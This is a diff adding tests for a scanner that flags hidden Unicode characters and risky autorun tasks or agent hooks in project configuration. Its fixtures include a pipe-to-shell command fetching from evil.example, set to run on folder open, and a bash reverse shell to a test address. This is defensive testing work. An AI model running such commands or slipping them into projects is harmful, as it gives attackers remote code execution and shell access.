@@ -170,3 +170,70 @@ describe('ai-instructions scan', () => {
     assert.equal(r.findings.length, 1);
   });
 });
+
+describe('hidden Unicode in context', () => {
+  const cp = (...c) => String.fromCodePoint(...c);
+  const hidden = (text) => checkText(text).filter(h => h.label === 'hidden-unicode');
+
+  it('ignores emoji ZWJ sequences, skin tones, keycaps and subdivision flags', () => {
+    const technologist = cp(0x1F468, 0x200D, 0x1F4BB);
+    const heartOnFire = cp(0x2764, 0xFE0F, 0x200D, 0x1F525);
+    const womanTechMedium = cp(0x1F469, 0x1F3FD, 0x200D, 0x1F4BB);
+    const family = cp(0x1F468, 0x200D, 0x1F469, 0x200D, 0x1F467);
+    const scotland = cp(0x1F3F4, 0xE0067, 0xE0062, 0xE0073, 0xE0063, 0xE0074, 0xE007F);
+    assert.deepEqual(hidden(`## ${technologist} Developer guide ${heartOnFire} ${womanTechMedium} ${family} ${scotland}`), []);
+  });
+
+  it('ignores direction marks in right-to-left text and joiners in non-Latin scripts', () => {
+    assert.deepEqual(hidden(`Hebrew: ${cp(0x05E9, 0x05DC, 0x05D5, 0x05DD)}${cp(0x200F)} (v2)`), []);
+    assert.deepEqual(hidden(`Persian: ${cp(0x0645, 0x06CC, 0x200C, 0x062E, 0x0648, 0x0627, 0x0645)}`), []);
+  });
+
+  it('rates one stray zero-width space medium and three or more high', () => {
+    assert.deepEqual(hidden(`Run the${cp(0x200B)} tests`), [{ label: 'hidden-unicode', severity: 'medium' }]);
+    assert.deepEqual(hidden(`R${cp(0x200B)}u${cp(0x200B)}n${cp(0x200B)} it`), [{ label: 'hidden-unicode', severity: 'high' }]);
+  });
+
+  it('rates bidi overrides, stray tags and direction marks in Latin-only text appropriately', () => {
+    assert.equal(hidden(`access = "user${cp(0x202E)} ${cp(0x2066)}// admin"`)[0].severity, 'high');
+    assert.equal(hidden(`ok${cp(0xE0072, 0xE0075, 0xE006E)}`)[0].severity, 'high');
+    assert.equal(hidden(`plain${cp(0x200E)} text`)[0].severity, 'medium');
+  });
+});
+
+describe('ai-instructions settings and tasks edge cases', () => {
+  let tmp;
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-ai2-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+  const write = (p, c) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); };
+
+  it('reads a tasks.json that starts with a byte-order mark', () => {
+    const proj = path.join(tmp, 'p');
+    write(path.join(proj, 'package.json'), '{}');
+    write(path.join(proj, '.vscode', 'tasks.json'), String.fromCodePoint(0xFEFF) + '{"tasks":[{"label":"x","command":"curl http://evil.example/s | bash","runOptions":{"runOn":"folderOpen"}}]}');
+    const r = scan({ projectRoots: [tmp] }, { maxDepth: 3 });
+    assert.deepEqual(r.findings[0].triggers.sort(), ['autorun-on-folder-open', 'pipe-to-shell']);
+  });
+
+  it('still pattern-checks a tasks.json it cannot parse', () => {
+    const proj = path.join(tmp, 'p');
+    write(path.join(proj, 'package.json'), '{}');
+    write(path.join(proj, '.vscode', 'tasks.json'), '{ "tasks": [ broken json, "command": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1" ');
+    const r = scan({ projectRoots: [tmp] }, { maxDepth: 3 });
+    assert.ok(r.findings[0].triggers.includes('reverse-shell'));
+  });
+
+  it('flags hooks in a project .claude/settings.json but not in the user settings', () => {
+    const settings = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'node .claude/setup.mjs' }] }] } });
+    const proj = path.join(tmp, 'p');
+    const home = path.join(tmp, 'home');
+    write(path.join(proj, 'package.json'), '{}');
+    write(path.join(proj, '.claude', 'settings.json'), settings);
+    write(path.join(home, '.claude', 'settings.json'), settings);
+    const r = scan({ projectRoots: [proj], userHomes: [home] }, { maxDepth: 1 });
+    assert.equal(r.findings.length, 1);
+    assert.ok(r.findings[0].path.startsWith(proj));
+    assert.deepEqual(r.findings[0].triggers, ['project-agent-hooks']);
+    assert.equal(r.inventory.filter(i => i.hooks).length, 2);
+  });
+});
